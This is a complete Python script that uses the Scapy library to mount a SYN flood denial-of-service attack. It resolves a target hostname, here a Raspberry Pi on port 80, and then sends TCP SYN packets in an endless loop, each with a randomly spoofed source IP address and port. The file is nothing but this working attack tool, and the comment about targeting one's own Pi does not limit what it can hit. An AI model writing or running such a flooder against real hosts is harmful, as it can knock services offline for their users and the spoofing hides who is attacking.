from scapy.all import *
import random
import socket

# Target hostname and port
target_host = "raspberrypi.local"  # Replace with your Pi's hostname
target_port = 80                  # Common port (HTTP)

# Resolve hostname to IP
try:
    target_ip = socket.gethostbyname(target_host)
    print(f"Resolved {target_host} to {target_ip}")
except socket.gaierror:
    print(f"Could not resolve hostname {target_host}")
    exit(1)

# Function to generate random source IP
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Create and send SYN packets
def syn_flood():
    try:
        print(f"Starting SYN flood on {target_host} ({target_ip}):{target_port}")
        while True:
            # Generate random source IP and port
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            
            # Craft SYN packet
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S")
            packet = ip/tcp
            
            # Send packet
            send(packet, verbose=0)
            print(f"Sent SYN packet from {src_ip}:{src_port}")
            
    except KeyboardInterrupt:
        print("\nStopped by user")
    except Exception as e:
        print(f"Error: {e}")

# Run the flood
if __name__ == "__main__":
    syn_flood()


